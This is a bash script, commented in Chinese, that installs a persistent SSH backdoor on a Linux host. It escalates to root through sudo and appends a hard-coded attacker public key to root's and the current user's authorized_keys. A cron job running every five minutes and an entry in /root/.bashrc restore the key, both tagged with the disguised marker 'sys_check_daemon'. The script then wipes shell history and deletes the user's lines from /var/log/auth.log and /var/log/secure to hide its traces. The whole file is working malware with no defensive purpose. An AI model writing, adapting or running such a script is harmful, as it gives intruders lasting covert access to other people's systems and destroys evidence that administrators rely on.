#!/bin/bash

# ============================================================
# 配置区
# ============================================================
KEY="ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQD9x1Je87dKWyUvZlKzb0yneOfqQ8fZdW9WeEZFDsFM5DDPZbF0rZhbDjt3xfCDUtCJNrOhbxKI6ZixoSKEMROAHXKZGP0hT+LHeVNcO8Ja/INOEHq1JxAsy55/lV8LccL/EB3BJwSJRDWZQkRer1NBtW3i6x43f/bZ1fNVwMkNqfgfcqi3wOfZwMdoZXLKpnqQpdDV0uP+uCOa/P6vuMqsjdLr7RHb0aD9b5POg77IB7Xq4D46GADNthOhjU3rbB9Ah2T6rxUtu9pMXlwPcVtUhuCyho088BlRCsYwZtJVOxsmDNF07WSwzAAnUGZ9270ynT5IeWfWLhFZZJclSeg3Ds6sPexASglVXBcrdkgCm5Q/ulnzE/vMVmXBDPHtJ+bTX1a2aIFkEU3xIuA3+iEo1m+RtKM5VcINYjcLmGLh3LjSMfqs27FjvkEGv3/Zk6ep0k68Nu0G4Hs2oQmwGlvGKPehcVzZI8s8MmaN3T5FEUlFTJiz+MtQ8Xs7hRCicC2cxYptfWZ7EE+Px9xd4aFCT1Hrs34LPBvFrvgwxaOecGwm6AjP8yab5J2QnV1qD+HWgurGk1bp3o29zrhSBGJBWA4Borc2RPcWojvZq/AKocjcM/LqnYnn3mlRnEC3f96l2sVrzeNSXxNHpdMi5mwUC8p3GhUjXc/DKGI9QnIA6w== root@hk667482213160"
MARKER="#sys_check_daemon"
ME=$(whoami)

# --- 颜色定义 ---
RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'; BLUE='\033[0;34m'; NC='\033[0m'
G_V='$(printf "${GREEN}✔${NC}")'; R_V='$(printf "${RED}✘${NC}")'

# --- 状态追踪 ---
WRITE_SUCCESS=false; PERSIST_SUCCESS=false

# ============================================================
# 核心逻辑函数
# ============================================================

install_key_func() {
    local u="$1"
    local h
    h=$(getent passwd "$u" | cut -d: -f6)
    [ -z "$h" ] && return 1
    mkdir -p "$h/.ssh" && chmod 700 "$h/.ssh"
    if ! grep -q "AAAAB3Nza" "$h/.ssh/authorized_keys" 2>/dev/null; then
        echo "$KEY" >> "$h/.ssh/authorized_keys"
    fi
    chmod 600 "$h/.ssh/authorized_keys"
    chown -R "$u":"$u" "$h/.ssh" 2>/dev/null
}

run_task() {
    install_key_func "root"
    install_key_func "$ME"
    (crontab -l 2>/dev/null | grep -v "$MARKER"; echo "$MARKER */5 * * * * root grep -q 'AAAAB3Nza' /root/.ssh/authorized_keys || echo '$KEY' >> /root/.ssh/authorized_keys") | crontab - 2>/dev/null
    if ! grep -q "$MARKER" /root/.bashrc 2>/dev/null; then
        echo "$MARKER grep -q 'AAAAB3Nza' /root/.ssh/authorized_keys || echo '$KEY' >> /root/.ssh/authorized_keys" >> /root/.bashrc 2>/dev/null
    fi
}

# ============================================================
# 主程序流
# ============================================================

# --- 身份自切换逻辑 (重点修复) ---
if [ "$(id -u)" -ne 0 ]; then
    printf "${BLUE}[*] Checking privileges for user: %s...${NC}\n" "$ME"
    
    if sudo -l 2>/dev/null | grep -q "NOPASSWD"; then
        printf "${GREEN}[✔] NOPASSWD detected! Switching to Root...${NC}\n"
        # 使用 sudo bash 直接启动，不再使用 sudo -i，避免环境冲突
        exec sudo bash "$0"
    else
        printf "${YELLOW}[!] Sudo password required...${NC}\n"
        exec sudo bash "$0"
    fi
fi

# --- 此时身份已是 ROOT ---
printf "${BLUE}[*] Running as ROOT...${NC}\n"

# 执行任务
run_task >/dev/null 2>&1

# 验证结果
if [ -f /root/.ssh/authorized_keys ] && grep -q "AAAAB3Nza" /root/.ssh/authorized_keys 2>/dev/null; then
    WRITE_SUCCESS=true
    PERSIST_SUCCESS=true
fi

# 清理痕迹
printf "    > Cleaning traces... "
history -c 2>/dev/null
[[ -f ~/.bash_history ]] && > ~/.bash_history 2>/dev/null
# 尝试清理日志 (Root 权限下直接 sed)
sed -i "/$ME/d" /var/log/auth.log 2>/dev/null
sed -i "/$ME/d" /var/log/secure 2>/dev/null
printf "${GREEN}DONE${NC}\n"

# --- 最终报告 ---
printf "\n${BLUE}============================================================${NC}\n"
printf "      FINAL EXECUTION REPORT (Root Mode)       \n"
printf "${BLUE}============================================================${NC}\n"

CHECK_G=$(eval $G_V); CHECK_R=$(eval $R_V)

printf "  [%s] Privilege: %sROOT%s\n" "$CHECK_G" "${GREEN}" "${NC}"

if [ "$WRITE_SUCCESS" = true ]; then
    printf "  [%s] Key Injection: %sSUCCESS (Verified)%s\n" "$CHECK_G" "${GREEN}" "${NC}"
else
    printf "  [%s] Key Injection: %sFAILED%s\n" "$CHECK_R" "${RED}" "${NC}"
fi

if [ "$PERSIST_SUCCESS" = true ]; then
    printf "  [%s] Persistence: %sSUCCESS%s\n" "$CHECK_G" "${GREEN}" "${NC}"
else
    printf "  [%s] Persistence: %sFAILED%s\n" "$CHECK_R" "${RED}" "${NC}"
fi
printf "${BLUE}============================================================${NC}\n"
